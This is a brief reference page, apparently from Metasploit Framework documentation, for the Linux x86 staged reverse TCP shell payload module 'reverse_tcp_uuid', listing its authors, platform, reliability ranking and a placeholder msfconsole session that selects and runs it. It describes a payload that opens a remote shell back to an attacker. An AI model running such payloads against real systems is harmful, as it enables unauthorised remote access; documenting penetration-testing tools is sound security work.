## Linux Command Shell, Reverse TCP Stager

Spawn a command shell (staged). Connect back to the attacker


## Module Name
payload/linux/x86/shell/reverse_tcp_uuid

## Authors
* skape
* egypt
* OJ Reeves





## Platforms
* linux

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/linux/x86/shell/reverse_tcp_uuid
msf payload(reverse_tcp_uuid) > show targets
   ... a list of targets ...
msf payload(reverse_tcp_uuid) > set TARGET <target-id>
msf payload(reverse_tcp_uuid) > show options
   ... show and set options ...
msf payload(reverse_tcp_uuid) > run
```
    
    